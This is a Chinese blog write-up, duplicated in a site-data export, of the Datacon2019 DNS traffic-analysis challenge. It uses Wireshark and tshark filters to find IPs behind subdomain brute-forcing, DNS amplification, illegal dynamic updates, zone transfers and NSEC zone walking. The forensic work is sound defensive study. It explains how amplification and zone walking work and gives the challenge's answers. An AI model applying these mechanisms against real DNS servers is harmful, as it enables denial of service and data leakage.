DNS资源记录（RR）类型——AXFR和IXFR AXFR（完全区域传输 252）：由主域名服务器转移整个区域文件至辅助域名服务器。 IXFR（增量区域传输 251）：请求只有与先前流水式编号不同的特定区域的区域转移。此请求有机会被拒绝，如果权威服务器由于配置或缺乏必要的数据而无法履行请求，一个完整的（AXFR）会被发送以作回应。 详细介绍 DNSSEC协议 浅谈DNS域名安全扩展协议DNSSEC 解题过程 子域名爆破攻击 攻击原理 链接](https://www.secpulse.com/archives/55823.html) 发现过程 首先，用 Wireshark 打开 pcap 包，绘制 IO Graphs： 可见，在 5500 - 6000s 中出现了异常的峰值流量，将5500s到6000s所有请求、响应提取到新的 pcap文件。 接下来使用 协议分级 查看哪些协议占比最多： 可以看到，切出来的包里面仅有DNS协议，而且用户主动发送的数据包占比最大。 查看分组长度 长度为1280~2559字节的数据包通常表示数据传输，长度较小的数据包则表示协议控制序列 以请求数量从高到低的 IP 地址进行排序。 方法一(速度很慢)： 使用wireshark的统计功能，并且用dns.flags.response == 0进行筛选(只看DNS查询报文)： 方法二： 使用tshark命令行进行筛选tshark -r timeTop.pcap -T fields -e ip.src -e ip.dst | tr &quot;\\t&quot; &quot;\\n&quot; | sort | uniq -c | sort -nr &gt; ipRank.txt 参数解释： -r 指定目标文件 -Y 指定过滤规则 -T pdml|ps|text|fields|psml,设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text -e 如果-T fields选项指定，-e用来指定输出哪些字段 首先查看第一个IP 45.80.170.1： 可以看到这个IP地址是一个DNS服务。 再来查看第二个IP 144.202.64.226： 144.202.64.226 发起了大量针对b0e.com.cn域名的查询请求，且大部分相应结果均为 No such name，因此判断此类攻击为子域名爆破攻击。 通过观察，可以发现，前 10 个请求并不是域名爆破攻击，去掉该 10 个请求后，第一类攻击共有 34184 个。 DDOS反射放大攻击 攻击原理 流量放大：利用回复包比请求包大的特点 地址伪造：伪造请求包的源地址为攻击目标 分布式：多个 DNS 同时向攻击目标返回大量响应 攻击特征 通过递归查询从而放大流量，因此recursion=1，ANY参数（为什么必须是ANY参数）。 要求返回包远远大于发送包，一般返回包的要求大于3000。即dns.rr.udp_payload_size&gt;=3000。 发现过程 通过攻击特征可以得出筛选条件dns.flags.response == 0 &amp;&amp; dns.flags.recdesired == 1 &amp;&amp; dns.qry.type == 255 &amp;&amp; dns.rr.udp_payload_size &gt;= 3000，再对筛选后的IP地址进行统计：tshark -r q1_final.pcap -Y &quot;dns.flags.recdesired==1 &amp;&amp; dns.flags.response==0 &amp;&amp; dns.rr.udp_payload_size&gt;=3000 &amp;&amp; dns.qry.type==255&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c| sort -nr|more 这样就过滤出了 DNS 服务响应数据了，一共有188.141.167.218，187.199.129.12，70.85.232.160，45.80.170.1四个DNS服务器，接着排除不支持 ANY 的 DNS 服务器，也就是 Refused： 排查之后，可知攻击IP（也就是排除目的IP为45.80.170.1的源IP）：127.130.104.152，175.222.102.169，105.191.150.205。 非法DNS 动态更新攻击 攻击原理 这里对DNS Dynamic Update有比较详细的介绍。简单地来说，DNS 客户端在 IP 地址或名称出现更改的任何时候都可利用 DNS 服务器来注册和动态更新其资源记录，攻击者可以利用 IP 欺骗伪装成 DNS 服务器信任的主机对区数据进行添加、删除和替换。 攻击特征： dns.flags.opt==5显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息 发现过程 使用tshark命令筛选：tshark -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -nr|more 可以看到，有四个攻击IP：19.220.251.87 414，200.152.141.106 15，18.100.48.86 4091，237.205.156.233 535 非法DNS域传输攻击 攻击原理 辅 DNS 服务器，需要与主 DNS 服务器进行通信，加载数据信息，称为区域传送（Zone Transfer）。AXFR 请求，常导致全区域传送，需要花费大量的时间与带宽。 大量的 AXFR 、IXFR请求，可导致 DDoS。权限配置不当，可导致信息泄露（测试域名、内部域名）。 攻击特征 dns.flags.repsonse==0 &amp;&amp; dns.qry.type==252 || dns.qry.type==251 发现过程 我们用过滤器dns.qry.type in &#123;251 252&#125;把AXFR和IXFR过滤出来，查看有哪些疑似攻击IP 有两个221.223.19.169 和一个129.191.74.107 发来的域传送请求包，以及大量的96.199.230.176 发来的域传送请求包。仔细检查一下前两个IP地址的数据包后，我们认为前面两个有可能是管理员配置不当等造成的， 而最后的一个大量的请求数据包显然就是域传送攻击了。 DNSSec NSec 域名遍历攻击 攻击原理 DNSSec的概念与作用 NSEC：Walking a DNS zone NSEC枚举这是针对DNSSEC的一种攻击，在未使用NSEC3的DNSSEC中，若查询区文件中不存在的域名，会以NSEC记录的形式提供靠近其的最近的下一条域名，这就造成了可能构造特殊请求，来遍历区文件，造成区文件的泄露。 攻击特征 域名遍历攻击依赖于NSec资源记录类型，可以使用``dns.resp.type==47`进行初步筛选 发现过程 可以看到我们把ANY反射型Dos攻击也筛选出来了，于是再加上not dns.qry.type==255条件就可以得到DNSSec NSec 域名遍历攻击IP：6.116.183.244 Q&amp;A pacp包文件过大，Wireshark加载失败 解决办法：使用 editcap -c &lt;packets per file&gt; 原始文件.pcap 输出文件.pcap 命令；或者使用tcpdump -r old_file -w new_files -C 10，在这个例子中，每个文件的大小是10 million字节。 bash管道格式化输出命令 tr sort -nc sort | uniq -c awk more wc 几个经常用到的DNS显示过滤器的实例 dns.flags.response=0(DNS查询消息) dns.flags.response=1(DNS响应消息) dns.flags.rcode=0(显示RCODE字段值为0(Noerror)的DNS应答消息) dns.flags.rcode=3(显示RCODE字段值为3(NXDomain,表示域名不存在)的DNS应答消息) dns.flags.opcode=0(显示DNS常规查询消息，以及相应的DNS响应消息) dns.flags.opcode=1(显示DNS逆向查询消息，以及相应的DNS响应消息) dns.flags.opcode=2(显示DNS服务器状态请求查询消息，以及相应的DNS服务器状态响应消息) dns.flags.opcode=5(显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息) dns.flags.recdesired=1(RD标记位置1的DNS查询消息一般为主机发出，目的是要求接受该消息的DNS服务器执行递归查询) dns.flags.recdesired=0(显示RD标记位置0的DNS递归反复查询及响应消息) 常用的查询字段 字段 描述 字段 描述 frame.len 数据长度 dns.flags.authenticated 服务器是否为域权威服务器 ip.src 源IP dns.flags.checkisable 非认证数据是否可接收 ip.dst 目的IP dns.flags.rcode DNS reply code udp.srcport 源udp端口号 dns.count.quires 数据包中DNS请求数 udp.dstport 目的udp端口号 dns.count.answers 数据包中DNS回答数 eth.src 源MAC地址 dns.count.auth_rr 数据包中权威记录数 eth.dst 目的MAC地址 dns.count.add_rr 数据包中额外记录数 dns.id DNS Transaction ID dns.qry.name DNS请求名 dns.flags.response DNS请求/现有响应标志 dns.qry.class DNS请求类型 dns.flags.opcode DNS opcode dns.resp.name DNS响应名 dns.flags.authoritative 应答是否被服务器认证 dns.resp.type DNS回复类型 dns.flags.truncated 消息是否被截断 dns.resp.ttl DNS响应生存时间 dns.flags.recdesired 是否递归查询 dns.resp.z.do DNS是否支持DNSSEC dns.flags.reavail 服务器是否能递归查询 frame.time_relative frame相对时间 常用查询字段类型 TYPE 值 含义 A 1 主机地址 NS 2 权威服务器 CNAME 5 别名的正则名称 SOA 6 标记权威区域的开始 PTR 12 域名指针 MX 15 邮件交换 TXT 16 文本字符串 DS 43 委托签发者 IXFR 251 增量区域转移 AXFR 252 权威区域转移 * 255 所有解析记录，也成为ANY 总结与反思 看了很多大佬们写的Writeup，照葫芦画瓢复现了DNS恶意流量分析，期间遇到了不少的困难，比如： 对DNS协议了解很少 数据包非常大，没有攻击流量的标注 对流量分析基本是零起步，不知道该从哪里开始分析，没有一个合理的逻辑思维 经过这一轮的复现之后，可以说对流量分析有了一定的了解，知道了一些DNS的攻击手段以及攻击特征，还有若干非常实用的文件处理命令。但是，依然存在很多不足，所以打算以shyoshyo撰写的Writeup为模板，有条理、有逻辑的进行第二轮流量分析。","tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"http://ca0y1h.top/tags/Wireshark/"},{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"DNS","slug":"DNS","permalink":"http://ca0y1h.top/tags/DNS/"},{"name":"Datacon2019","slug":"Datacon2019","permalink":"http://ca0y1h.top/tags/Datacon2019/"}],"categories":[{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"比赛题","slug":"流量分析/比赛题","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}]},{"title":"Datacon2019-q1-Writeup-v1","date":"2019-07-15T12:44:20.000Z","path":"Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1/","text":"Datacon2019-q1-Writeup-v1 一、题目说明 题目背景 假如你是某网络的管理员，近日接到告警称，网络中存在 DNS 攻击行为，希望你进行调查。现捕获到网络中的 DNS 流量，请对其中的攻击行为进行分析。 题目要点 DNS是互联网中重要的基础设施之一，对网络的稳定运行有至关重要的作用。然而，由于设计缺陷，DNS 存在诸多脆弱点，因此可被利用与诸多攻击。本题对常见的 DNS 安全问题进行考察。 二、知识储备 DNS协议及报文格式 这篇文章对于DNS讲的还比较透彻，在此基础做一点摘要。 域名层次结构 域名层次 域名服务器 另外还有一个本地域名服务器：当一个主机发出DNS查询请求的时候，这个查询请求首先就是发给本地域名服务器的。 域名解析过程 以查询jocent.me为例，其中10.74.36.90为主机IP，10.74.1.11为本地DNS服务器： ①主机10.74.36.90先向本地域名服务器10.74.1.11进行递归查询 ②本地域名服务器采用迭代查询，向一个根域名服务器进行查询 ③根域名服务器告诉本地域名服务器，下一次应该查询的顶级域名服务器dns.me的IP地址 ④本地域名服务器向顶级域名服务器dns.me进行查询 ⑤顶级域名服务器me告诉本地域名服务器，下一步查询权限服务器dns.jocent.me的IP地址 ⑥本地域名服务器向权限服务器dns.jocent.me进行查询 ⑦权限服务器dns.jocent.me告诉本地域名服务器所查询的主机的IP地址 ⑧本地域名服务器最后把查询结果告诉 10.74.36.90 其中有两个概念递归查询和迭代查询: 递归查询：本机向本地域名服务器发出一次查询请求，就静待最终的结果。如果本地域名服务器无法解析，自己会以DNS客户机的身份向其它域名服务器查询，直到得到最终的IP地址告诉本机。 迭代查询：本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。 报文格式 DNS资源记录ANY类型 为什么在DDOS方法攻击的时候需要指定ANY类型参数，我们使用dig命令来看一下具体情况： 可以看到，DNS服务器返回了该服务器中所有关于163.com的资源记录，包括类型A，NS，MX，TXT，这样就使得响应数据包远远大于请求数据包。 我们不妨再往深层次想一想，已知UDP数据包的最大长度是512字节，也就是说当DNS响应数据大于512字节的时候，数据只返回512字节，剩余的数据将被丢弃。为什么在这个地方DNS的响应数据可以返回大于2000字节的数据呢？可以去查看请求数据包中的Additional Records有一条OPT类型的资源记录，OPT类型是一种一个“伪 DNS记录类型”以支持 EDNS协议，其中UDP Payload Size字段可以指定DNS返回报文的最大长度。这里对EDNS有比较详细的解释。 DNS攻击类型 这里有对DNS的各种攻击类型的介绍。 dns.flags.opt常见的值 dns.flags.opcode=0(只显示DNS常规查询消息，以及相应的DNS响应消息) dns.flags.opcode=1(只显示DNS逆向查询消息，以及相应的DNS响应消息) dns.flags.opcode=2(只显示DNS服务器状态请求查询消息，以及相应的DNS服务器状态响应消息) dns.flags.opcode=5(只显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息） DNS资源记录（RR）类型——NS和SOA NS和SOA的区别 SOA，即Start Of Authority，放在 zone file 中，用于描述这个 zone 负责的 name server，version number…等资料，以及当 slave server 要备份这个 zone 时的一些参数。每个 zone file 中必须有且仅有一条 SOARR ，并在 zone file 中作为第一条资源记录保存。 DNS资源记录（RR）类型——AXFR和IXFR AXFR（完全区域传输 252）：由主域名服务器转移整个区域文件至辅助域名服务器。 IXFR（增量区域传输 251）：请求只有与先前流水式编号不同的特定区域的区域转移。此请求有机会被拒绝，如果权威服务器由于配置或缺乏必要的数据而无法履行请求，一个完整的（AXFR）会被发送以作回应。 详细介绍 DNSSEC协议 浅谈DNS域名安全扩展协议DNSSEC 三、解题过程 1.子域名爆破攻击 攻击原理 传送门 发现过程 首先，用 Wireshark 打开 pcap 包，绘制 IO Graphs： 可见，在 5500 - 6000s 中出现了异常的峰值流量，将5500s到6000s所有请求、响应提取到新的 pcap文件。 接下来使用 协议分级 查看哪些协议占比最多： 可以看到，切出来的包里面仅有DNS协议，而且用户主动发送的数据包占比最大。 查看分组长度 长度为1280~2559字节的数据包通常表示数据传输，长度较小的数据包则表示协议控制序列 以请求数量从高到低的 IP 地址进行排序。 方法一(速度很慢)： 使用wireshark的统计功能，并且用dns.flags.response == 0进行筛选(只看DNS查询报文)： 方法二： 使用tshark命令行进行筛选tshark -r timeTop.pcap -T fields -e ip.src -e ip.dst | tr &quot;\\t&quot; &quot;\\n&quot; | sort | uniq -c | sort -nr &gt; ipRank.txt 参数解释： -r 指定目标文件 -Y 指定过滤规则 -T pdml|ps|text|fields|psml,设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text -e 如果-T fields选项指定，-e用来指定输出哪些字段 首先查看第一个IP 45.80.170.1： 可以看到这个IP地址是一个DNS服务。 再来查看第二个IP 144.202.64.226： 144.202.64.226 发起了大量针对b0e.com.cn域名的查询请求，且大部分相应结果均为 No such name，因此判断此类攻击为子域名爆破攻击。 通过观察，可以发现，前 10 个请求并不是域名爆破攻击，去掉该 10 个请求后，第一类攻击共有 34184 个。 2. DDOS反射放大攻击 攻击原理 流量放大：利用回复包比请求包大的特点 地址伪造：伪造请求包的源地址为攻击目标 分布式：多个 DNS 同时向攻击目标返回大量响应 攻击特征 通过递归查询从而放大流量，因此recursion=1，ANY参数（为什么必须是ANY参数）。 要求返回包远远大于发送包，一般返回包的要求大于3000。即dns.rr.udp_payload_size&gt;=3000。 发现过程 通过攻击特征可以得出筛选条件dns.flags.response == 0 &amp;&amp; dns.flags.recdesired == 1 &amp;&amp; dns.qry.type == 255 &amp;&amp; dns.rr.udp_payload_size &gt;= 3000，再对筛选后的IP地址进行统计：tshark -r q1_final.pcap -Y &quot;dns.flags.recdesired==1 &amp;&amp; dns.flags.response==0 &amp;&amp; dns.rr.udp_payload_size&gt;=3000 &amp;&amp; dns.qry.type==255&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c| sort -nr|more 这样就过滤出了 DNS 服务响应数据了，一共有188.141.167.218，187.199.129.12，70.85.232.160，45.80.170.1四个DNS服务器，接着排除不支持 ANY 的 DNS 服务器，也就是 Refused： 排查之后，可知攻击IP（也就是排除目的IP为45.80.170.1的源IP）：127.130.104.152，175.222.102.169，105.191.150.205。 3. 非法DNS 动态更新攻击 攻击原理 这里对DNS Dynamic Update有比较详细的介绍。简单地来说，DNS 客户端在 IP 地址或名称出现更改的任何时候都可利用 DNS 服务器来注册和动态更新其资源记录，攻击者可以利用 IP 欺骗伪装成 DNS 服务器信任的主机对区数据进行添加、删除和替换。 攻击特征： dns.flags.opt==5显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息 发现过程 使用tshark命令筛选：tshark -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -nr|more 可以看到，有四个攻击IP：19.220.251.87 414，200.152.141.106 15，18.100.48.86 4091，237.205.156.233 535 4. 非法DNS域传输攻击 攻击原理 辅 DNS 服务器，需要与主 DNS 服务器进行通信，加载数据信息，称为区域传送（Zone Transfer）。AXFR 请求，常导致全区域传送，需要花费大量的时间与带宽。 大量的 AXFR 、IXFR请求，可导致 DDoS。权限配置不当，可导致信息泄露（测试域名、内部域名）。 攻击特征 dns.flags.repsonse==0 &amp;&amp; dns.qry.type==252 || dns.qry.type==251 发现过程 我们用过滤器dns.qry.type in &#123;251 252&#125;把AXFR和IXFR过滤出来，查看有哪些疑似攻击IP 有两个221.223.19.169 和一个129.191.74.107 发来的域传送请求包，以及大量的96.199.230.176 发来的域传送请求包。仔细检查一下前两个IP地址的数据包后，我们认为前面两个有可能是管理员配置不当等造成的， 而最后的一个大量的请求数据包显然就是域传送攻击了。 5. DNSSec NSec 域名遍历攻击 攻击原理 DNSSec的概念与作用 NSEC：Walking a DNS zone NSEC枚举这是针对DNSSEC的一种攻击，在未使用NSEC3的DNSSEC中，若查询区文件中不存在的域名，会以NSEC记录的形式提供靠近其的最近的下一条域名，这就造成了可能构造特殊请求，来遍历区文件，造成区文件的泄露。 攻击特征 域名遍历攻击依赖于NSec资源记录类型，可以使用``dns.resp.type==47`进行初步筛选 发现过程 可以看到我们把ANY反射型Dos攻击也筛选出来了，于是再加上not dns.qry.type==255条件就可以得到DNSSec NSec 域名遍历攻击IP：6.116.183.244 四、Q&amp;A pacp包文件过大，Wireshark加载失败 解决办法：使用 editcap -c &lt;packets per file&gt; 原始文件.pcap 输出文件.pcap 命令；或者使用tcpdump -r old_file -w new_files -C 10，在这个例子中，每个文件的大小是10 million字节。 bash管道格式化输出命令 tr sort -nc sort | uniq -c awk more wc 几个经常用到的DNS显示过滤器的实例 dns.flags.response=0(DNS查询消息) dns.flags.response=1(DNS响应消息) dns.flags.rcode=0(显示RCODE字段值为0(Noerror)的DNS应答消息) dns.flags.rcode=3(显示RCODE字段值为3(NXDomain,表示域名不存在)的DNS应答消息) dns.flags.opcode=0(显示DNS常规查询消息，以及相应的DNS响应消息) dns.flags.opcode=1(显示DNS逆向查询消息，以及相应的DNS响应消息) dns.flags.opcode=2(显示DNS服务器状态请求查询消息，以及相应的DNS服务器状态响应消息) dns.flags.opcode=5(显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息) dns.flags.recdesired=1(RD标记位置1的DNS查询消息一般为主机发出，目的是要求接受该消息的DNS服务器执行递归查询) dns.flags.recdesired=0(显示RD标记位置0的DNS递归反复查询及响应消息) 常用的查询字段 字段 描述 字段 描述 frame.len 数据长度 dns.flags.authenticated 服务器是否为域权威服务器 ip.src 源IP dns.flags.checkisable 非认证数据是否可接收 ip.dst 目的IP dns.flags.rcode DNS reply code udp.srcport 源udp端口号 dns.count.quires 数据包中DNS请求数 udp.dstport 目的udp端口号 dns.count.answers 数据包中DNS回答数 eth.src 源MAC地址 dns.count.auth_rr 数据包中权威记录数 eth.dst 目的MAC地址 dns.count.add_rr 数据包中额外记录数 dns.id DNS Transaction ID dns.qry.name DNS请求名 dns.flags.response DNS请求/现有响应标志 dns.qry.class DNS请求类型 dns.flags.opcode DNS opcode dns.resp.name DNS响应名 dns.flags.authoritative 应答是否被服务器认证 dns.resp.type DNS回复类型 dns.flags.truncated 消息是否被截断 dns.resp.ttl DNS响应生存时间 dns.flags.recdesired 是否递归查询 dns.resp.z.do DNS是否支持DNSSEC dns.flags.reavail 服务器是否能递归查询 frame.time_relative frame相对时间 常用查询字段类型 TYPE 值 含义 A 1 主机地址 NS 2 权威服务器 CNAME 5 别名的正则名称 SOA 6 标记权威区域的开始 PTR 12 域名指针 MX 15 邮件交换 TXT 16 文本字符串 DS 43 委托签发者 IXFR 251 增量区域转移 AXFR 252 权威区域转移 * 255 所有解析记录，也成为ANY 五、总结与反思 看了很多大佬们写的Writeup，照葫芦画瓢复现了DNS恶意流量分析，期间遇到了不少的困难，比如： 对DNS协议了解很少 数据包非常大，没有攻击流量的标注 对流量分析基本是零起步，不知道该从哪里开始分析，没有一个合理的逻辑思维 经过这一轮的复现之后，可以说对流量分析有了一定的了解，知道了一些DNS的攻击手段以及攻击特征，还有若干非常实用的文件处理命令。但是，依然存在很多不足，所以打算以shyoshyo撰写的Writeup为模板，有条理、有逻辑的进行第二轮流量分析。","tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"http://ca0y1h.top/tags/Wireshark/"},{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"DNS","slug":"DNS","permalink":"http://ca0y1h.top/tags/DNS/"},{"name":"Datacon2019","slug":"Datacon2019","permalink":"http://ca0y1h.top/tags/Datacon2019/"}],"categories":[{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"比赛题","slug":"流量分析/比赛题","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}]}],"categories":[{"name":"Web基础安全学习","slug":"Web基础安全学习","permalink":"http://ca0y1h.top/categories/Web%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"Web安全基础学习","slug":"Web安全基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"},{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"},{"name":"Web安全","slug":"Web安全","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"Web安全/基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"},{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"},{"name":"Ruby和Go","slug":"CTF/Ruby和Go","permalink":"http://ca0y1h.top/categories/CTF/Ruby%E5%92%8CGo/"},{"name":"NodeJS","slug":"CTF/NodeJS","permalink":"http://ca0y1h.top/categories/CTF/NodeJS/"},{"name":"Python","slug":"CTF/Python","permalink":"http://ca0y1h.top/categories/CTF/Python/"},{"name":"文件包含","slug":"CTF/文件包含","permalink":"http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"文件上传","slug":"CTF/文件上传","permalink":"http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"SSRF","slug":"CTF/SSRF","permalink":"http://ca0y1h.top/categories/CTF/SSRF/"},{"name":"XSS","slug":"CTF/XSS","permalink":"http://ca0y1h.top/categories/CTF/XSS/"},{"name":"命令执行","slug":"CTF/命令执行","permalink":"http://ca0y1h.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"SQL注入","slug":"CTF/SQL注入","permalink":"http://ca0y1h.top/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"},{"name":"代码审计","slug":"CTF/代码审计","permalink":"http://ca0y1h.top/categories/CTF/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/categories/ctf/"},{"name":"渗透测试","slug":"ctf/渗透测试","permalink":"http://ca0y1h.top/categories/ctf/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"框架漏洞","slug":"CTF/框架漏洞","permalink":"http://ca0y1h.top/categories/CTF/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"},{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"基础入门","slug":"机器学习/基础入门","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"name":"技术随笔","slug":"技术随笔","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"},{"name":"VulnHub","slug":"靶机/VulnHub","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/VulnHub/"},{"name":"网络安全","slug":"机器学习/网络安全","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"杂谈","slug":"杂谈","permalink":"http://ca0y1h.top/categories/%E6%9D%82%E8%B0%88/"},{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"编程/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"},{"name":"java","slug":"编程/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"},{"name":"流量分析","slug":"流量分析","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Bro","slug":"流量分析/Bro","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Bro/"},{"name":"算法","slug":"编程/算法","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/%E7%AE%97%E6%B3%95/"},{"name":"比赛题","slug":"流量分析/比赛题","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}],"tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"反序列化","slug":"反序列化","permalink":"http://ca0y1h.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"},{"name":"沙箱逃逸","slug":"沙箱逃逸","permalink":"http://ca0y1h.top/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"SSTI","slug":"SSTI","permalink":"http://ca0y1h.top/tags/SSTI/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"},{"name":"PHP","slug":"PHP","permalink":"http://ca0y1h.top/tags/PHP/"},{"name":"web安全学习","slug":"web安全学习","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"服务器解析漏洞","slug":"服务器解析漏洞","permalink":"http://ca0y1h.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"name":"LDAP","slug":"LDAP","permalink":"http://ca0y1h.top/tags/LDAP/"},{"name":"Web安全基础","slug":"Web安全基础","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHP变量解析","slug":"PHP变量解析","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/"},{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"},{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/tags/ctf/"},{"name":"PHP反序列化","slug":"PHP反序列化","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"SSRF","slug":"SSRF","permalink":"http://ca0y1h.top/tags/SSRF/"},{"name":"无参数函数利用","slug":"无参数函数利用","permalink":"http://ca0y1h.top/tags/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/"},{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"逻辑回归","slug":"逻辑回归","permalink":"http://ca0y1h.top/tags/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"name":"Linux 